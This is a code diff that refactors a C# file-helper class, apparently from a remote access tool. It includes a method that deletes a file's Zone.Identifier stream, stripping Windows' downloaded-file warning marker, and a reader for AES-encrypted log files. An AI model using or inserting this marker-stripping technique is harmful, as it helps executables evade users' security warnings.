@@ -17,10 +17,7 @@ namespace Q3C273.Shared.Helpers
         /// </summary>
         /// <param name="path">The path to check.</param>
         /// <returns>Returns <value>true</value> if the path contains illegal characters, otherwise <value>false</value>.</returns>
-        public static bool HasIllegalCharacters(string path)
-        {
-            return path.Any(c => IllegalPathChars.Contains(c));
-        }
+        public static bool HasIllegalCharacters(string path) => path.Any(c => IllegalPathChars.Contains(c));
 
         /// <summary>
         /// Gets a random file name.
@@ -28,10 +25,7 @@ namespace Q3C273.Shared.Helpers
         /// <param name="length">The length of the file name.</param>
         /// <param name="extension">The file extension including the dot, e.g. <value>.exe</value>.</param>
         /// <returns>The random file name.</returns>
-        public static string GetRandomFilename(int length, string extension = "")
-        {
-            return string.Concat(StringHelper.GetRandomString(length), extension);
-        }
+        public static string GetRandomFilename(int length, string extension = "") => string.Concat(StringHelper.GetRandomString(length), extension);
 
         /// <summary>
         /// Gets a path to an unused temp file. 
@@ -58,6 +52,8 @@ namespace Q3C273.Shared.Helpers
         {
             if (binary.Length < 2)
                 return false;
+
+            // Find Dos Header (MZ header)
             return binary[0] == 'M' && binary[1] == 'Z' || binary[0] == 'Z' && binary[1] == 'M';
         }
 
@@ -66,10 +62,7 @@ namespace Q3C273.Shared.Helpers
         /// </summary>
         /// <param name="filePath">The file path.</param>
         /// <returns>Returns <value>true</value> if the deletion was successful, otherwise <value>false</value>.</returns>
-        public static bool DeleteZoneIdentifier(string filePath)
-        {
-            return SharedNatives.DeleteFile(filePath + ":Zone.Identifier");
-        }
+        public static bool DeleteZoneIdentifier(string filePath) => SharedNatives.DeleteFile(filePath + ":Zone.Identifier");
 
         /// <summary>
         /// Appends text to a log file.
@@ -94,9 +87,6 @@ namespace Q3C273.Shared.Helpers
         /// </summary>
         /// <param name="filename">The filename of the log.</param>
         /// <param name="aes">The AES instance.</param>
-        public static string ReadLogFile(string filename, Aes256 aes)
-        {
-            return File.Exists(filename) ? Encoding.UTF8.GetString(aes.Decrypt(File.ReadAllBytes(filename))) : string.Empty;
-        }
+        public static string ReadLogFile(string filename, Aes256 aes) => File.Exists(filename) ? Encoding.UTF8.GetString(aes.Decrypt(File.ReadAllBytes(filename))) : string.Empty;
     }
 }
